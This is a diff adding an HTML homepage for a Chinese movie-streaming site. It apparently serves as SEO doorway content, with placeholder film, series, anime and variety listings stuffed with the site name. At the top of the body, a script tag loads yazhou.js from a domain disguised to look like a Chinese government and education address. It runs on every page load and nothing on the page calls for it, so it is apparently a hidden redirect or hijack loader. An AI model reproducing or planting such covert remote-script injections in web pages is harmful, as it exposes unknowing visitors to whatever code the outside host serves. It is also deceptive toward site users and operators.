@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>新视觉电影网 - 高清影视在线观看</title>
+<meta name="description" content="新视觉电影网提供最新电影、热播剧集、经典动漫及热门综艺在线观看，海量高清资源每日更新，尽在 xinshijuedianyingwang-app.github.io。">
+<meta name="keywords" content="新视觉电影网,电影,电视剧,动漫,综艺,在线观看">
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #0a0a1a;
+    color: #e0e0e0;
+    line-height: 1.6;
+}
+
+a {
+    color: #ff6b6b;
+    text-decoration: none;
+    transition: color 0.3s;
+}
+
+a:hover {
+    color: #ffd93d;
+}
+
+/* 头部 */
+.header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    padding: 1rem;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    border-bottom: 1px solid #0f3460;
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #ff6b6b;
+    text-shadow: 0 0 10px rgba(255,107,107,0.5);
+}
+
+.nav-menu {
+    display: flex;
+    gap: 1rem;
+    list-style: none;
+}
+
+.nav-menu a {
+    padding: 0.5rem 1rem;
+    border-radius: 20px;
+    font-size: 0.9rem;
+}
+
+.nav-menu a:hover {
+    background: rgba(255,107,107,0.1);
+}
+
+/* 英雄区 */
+.hero {
+    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><rect fill="%231a1a2e" width="1200" height="600"/><circle cx="200" cy="150" r="2" fill="%23ffffff" opacity="0.3"/><circle cx="400" cy="300" r="1.5" fill="%23ffffff" opacity="0.2"/><circle cx="600" cy="100" r="1" fill="%23ffffff" opacity="0.4"/><circle cx="800" cy="400" r="2" fill="%23ffffff" opacity="0.3"/><circle cx="1000" cy="200" r="1.5" fill="%23ffffff" opacity="0.2"/></svg>') center/cover;
+    padding: 4rem 1rem;
+    text-align: center;
+    position: relative;
+}
+
+.hero::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(10,10,26,0.85);
+}
+
+.hero-content {
+    position: relative;
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+.hero h1 {
+    font-size: 2rem;
+    margin-bottom: 1rem;
+    color: #fff;
+}
+
+.hero p {
+    font-size: 1rem;
+    margin-bottom: 2rem;
+    opacity: 0.9;
+}
+
+.search-box {
+    display: flex;
+    max-width: 500px;
+    margin: 0 auto;
+}
+
+.search-box input {
+    flex: 1;
+    padding: 0.8rem 1rem;
+    border: none;
+    border-radius: 25px 0 0 25px;
+    background: rgba(255,255,255,0.1);
+    color: #fff;
+    outline: none;
+}
+
+.search-box button {
+    padding: 0.8rem 1.5rem;
+    border: none;
+    border-radius: 0 25px 25px 0;
+    background: #ff6b6b;
+    color: #fff;
+    cursor: pointer;
+}
+
+/* 栏目通用 */
+.section {
+    padding: 3rem 1rem;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+.section-title {
+    font-size: 1.5rem;
+    margin-bottom: 2rem;
+    color: #ffd93d;
+    text-align: center;
+    position: relative;
+}
+
+.section-title::after {
+    content: '';
+    display: block;
+    width: 60px;
+    height: 3px;
+    background: #ff6b6b;
+    margin: 0.5rem auto;
+}
+
+/* 电影网格 */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 1.5rem;
+}
+
+.movie-card {
+    background: #16213e;
+    border-radius: 10px;
+    overflow: hidden;
+    transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.movie-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 5px 20px rgba(255,107,107,0.3);
+}
+
+.movie-poster {
+    width: 100%;
+    height: 200px;
+    background: linear-gradient(45deg, #0f3460, #1a1a2e);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 3rem;
+}
+
+.movie-info {
+    padding: 1rem;
+}
+
+.movie-title {
+    font-size: 0.9rem;
+    margin-bottom: 0.5rem;
+    color: #fff;
+}
+
+.movie-meta {
+    font-size: 0.75rem;
+    color: #aaa;
+}
+
+/* 电视剧列表 */
+.tv-list {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+}
+
+.tv-item {
+    display: flex;
+    gap: 1rem;
+    background: #16213e;
+    padding: 1rem;
+    border-radius: 10px;
+    align-items: center;
+}
+
+.tv-poster {
+    width: 80px;
+    height: 110px;
+    background: linear-gradient(45deg, #e94560, #0f3460);
+    border-radius: 5px;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.5rem;
+}
+
+.tv-detail h3 {
+    color: #fff;
+    margin-bottom: 0.5rem;
+}
+
+.tv-detail p {
+    font-size: 0.85rem;
+    opacity: 0.8;
+}
+
+/* 动漫横向滚动 */
+.anime-scroll {
+    display: flex;
+    gap: 1rem;
+    overflow-x: auto;
+    padding-bottom: 1rem;
+}
+
+.anime-scroll::-webkit-scrollbar {
+    height: 5px;
+}
+
+.anime-scroll::-webkit-scrollbar-thumb {
+    background: #ff6b6b;
+    border-radius: 5px;
+}
+
+.anime-card {
+    min-width: 180px;
+    background: #16213e;
+    border-radius: 10px;
+    overflow: hidden;
+}
+
+.anime-poster {
+    width: 100%;
+    height: 120px;
+    background: linear-gradient(45deg, #53354a, #903749);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 2rem;
+}
+
+.anime-info {
+    padding: 0.8rem;
+}
+
+.anime-info h4 {
+    font-size: 0.85rem;
+    color: #fff;
+}
+
+/* 综艺表格 */
+.variety-table {
+    width: 100%;
+    border-collapse: collapse;
+    background: #16213e;
+    border-radius: 10px;
+    overflow: hidden;
+}
+
+.variety-table th,
+.variety-table td {
+    padding: 1rem;
+    text-align: left;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+}
+
+.variety-table th {
+    background: rgba(255,107,107,0.1);
+    color: #ffd93d;
+}
+
+.variety-table tr:hover {
+    background: rgba(255,107,107,0.05);
+}
+
+/* 底部 */
+.footer {
+    background: #1a1a2e;
+    padding: 2rem 1rem;
+    text-align: center;
+    border-top: 1px solid #0f3460;
+    margin-top: 3rem;
+}
+
+.footer p {
+    margin-bottom: 0.5rem;
+    opacity: 0.7;
+    font-size: 0.85rem;
+}
+
+/* 响应式 */
+@media (max-width: 768px) {
+    .nav-menu {
+        width: 100%;
+        justify-content: center;
+        margin-top: 1rem;
+    }
+    
+    .hero h1 {
+        font-size: 1.5rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+    
+    .tv-item {
+        flex-direction: column;
+        text-align: center;
+    }
+    
+    .tv-poster {
+        width: 100px;
+        height: 140px;
+    }
+    
+    .variety-table {
+        font-size: 0.85rem;
+    }
+    
+    .variety-table th,
+    .variety-table td {
+        padding: 0.5rem;
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 头部导航 -->
+<header class="header">
+    <div class="nav-container">
+        <div class="logo">新视觉电影网</div>
+        <ul class="nav-menu">
+            <li><a href="#movies">电影</a></li>
+            <li><a href="#tv">电视剧</a></li>
+            <li><a href="#anime">动漫</a></li>
+            <li><a href="#variety">综艺</a></li>
+        </ul>
+    </div>
+</header>
+
+<!-- 英雄区 -->
+<section class="hero">
+    <div class="hero-content">
+        <h1>新视觉电影网 - 畅享高清影视</h1>
+        <p>每日更新最新电影、热播剧集、经典动漫与热门综艺，一键观看，尽在 xinshijuedianyingwang-app.github.io</p>
+        <div class="search-box">
+            <input type="text" placeholder="搜索电影/电视剧/动漫...">
+            <button>搜索</button>
+        </div>
+    </div>
+</section>
+
+<!-- 电影栏目 -->
+<section class="section" id="movies">
+    <h2 class="section-title">最新电影</h2>
+    <div class="movie-grid">
+        <div class="movie-card">
+            <div class="movie-poster">🎬</div>
+            <div class="movie-info">
+                <div class="movie-title">新视觉电影网推荐：流浪地球3</div>
+                <div class="movie-meta">科幻 / 2026 / 9.2分</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎥</div>
+            <div class="movie-info">
+                <div class="movie-title">封神演义之凤鸣岐山</div>
+                <div class="movie-meta">奇幻 / 2026 / 8.8分</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎞️</div>
+            <div class="movie-info">
+                <div class="movie-title">唐人街探案5</div>
+                <div class="movie-meta">喜剧 / 2026 / 8.5分</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">📽️</div>
+            <div class="movie-info">
+                <div class="movie-title">长津湖之水门桥2</div>
+                <div class="movie-meta">战争 / 2026 / 9.0分</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎦</div>
+            <div class="movie-info">
+                <div class="movie-title">独行月球2</div>
+                <div class="movie-meta">科幻 / 2026 / 8.7分</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎬</div>
+            <div class="movie-info">
+                <div class="movie-title">新视觉电影网独家：深海迷航</div>
+                <div class="movie-meta">冒险 / 2026 / 8.9分</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 电视剧栏目 -->
+<section class="section" id="tv">
+    <h2 class="section-title">热播电视剧</h2>
+    <div class="tv-list">
+        <div class="tv-item">
+            <div class="tv-poster">📺</div>
+            <div class="tv-detail">
+                <h3>庆余年 第三季</h3>
+                <p>古装权谋巨制，范闲再入朝堂，新视觉电影网同步热播中。</p>
+            </div>
+        </div>
+        <div class="tv-item">
+            <div class="tv-poster">📻</div>
+            <div class="tv-detail">
+                <h3>三体：黑暗森林</h3>
+                <p>科幻巨作改编，人类面对三体文明的终极抉择。</p>
+            </div>
+        </div>
+        <div class="tv-item">
+            <div class="tv-poster">📡</div>
+            <div class="tv-detail">
+                <h3>琅琊榜之山河依旧</h3>
+                <p>延续经典，新王登基，朝堂风云再起。</p>
+            </div>
+        </div>
+        <div class="tv-item">
+            <div class="tv-poster">📺</div>
+            <div class="tv-detail">
+                <h3>新视觉电影网推荐：大江大河4</h3>
+                <p>时代变迁中的个人命运，致敬改革开放。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 动漫栏目 -->
+<section class="section" id="anime">
+    <h2 class="section-title">经典动漫</h2>
+    <div class="anime-scroll">
+        <div class="anime-card">
+            <div class="anime-poster">🌸</div>
+            <div class="anime-info">
+                <h4>斗罗大陆 最终章</h4>
+            </div>
+        </div>
+        <div class="anime-card">
+            <div class="anime-poster">⚔️</div>
+            <div class="anime-info">
+                <h4>鬼灭之刃 无限城篇</h4>
+            </div>
+        </div>
+        <div class="anime-card">
+            <div class="anime-poster">🎌</div>
+            <div class="anime-info">
+                <h4>进击的巨人 终章后日谈</h4>
+            </div>
+        </div>
+        <div class="anime-card">
+            <div class="anime-poster">🐉</div>
+            <div class="anime-info">
+                <h4>新视觉电影网：完美世界2</h4>
+            </div>
+        </div>
+        <div class="anime-card">
+            <div class="anime-poster">🔥</div>
+            <div class="anime-info">
+                <h4>凡人修仙传 仙界篇</h4>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 综艺栏目 -->
+<section class="section" id="variety">
+    <h2 class="section-title">热门综艺</h2>
+    <table class="variety-table">
+        <thead>
+            <tr>
+                <th>节目名称</th>
+                <th>类型</th>
+                <th>更新时间</th>
+                <th>状态</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>新视觉电影网独家：欢乐喜剧人2026</td>
+                <td>喜剧竞演</td>
+                <td>每周六 20:00</td>
+                <td>更新中</td>
+            </tr>
+            <tr>
+                <td>奔跑吧·黄河篇5</td>
+                <td>户外竞技</td>
+                <td>每周五 21:00</td>
+                <td>更新中</td>
+            </tr>
+            <tr>
+                <td>歌手2026</td>
+                <td>音乐竞演</td>
+                <td>每周四 22:00</td>
+                <td>更新中</td>
+            </tr>
+            <tr>
+                <td>向往的生活 第八季</td>
+                <td>生活纪实</td>
+                <td>每周日 20:00</td>
+                <td>更新中</td>
+            </tr>
+        </tbody>
+    </table>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <p>© 2026 新视觉电影网 | <a href="https://xinshijuedianyingwang-app.github.io">xinshijuedianyingwang-app.github.io</a></p>
+    <p>关键词：新视觉电影网 - 高清电影在线观看首选平台</p>
+    <p>本网站仅提供影视信息展示，资源来自互联网，如有侵权请联系删除。</p>
+</footer>
+
+</body>
+</html>
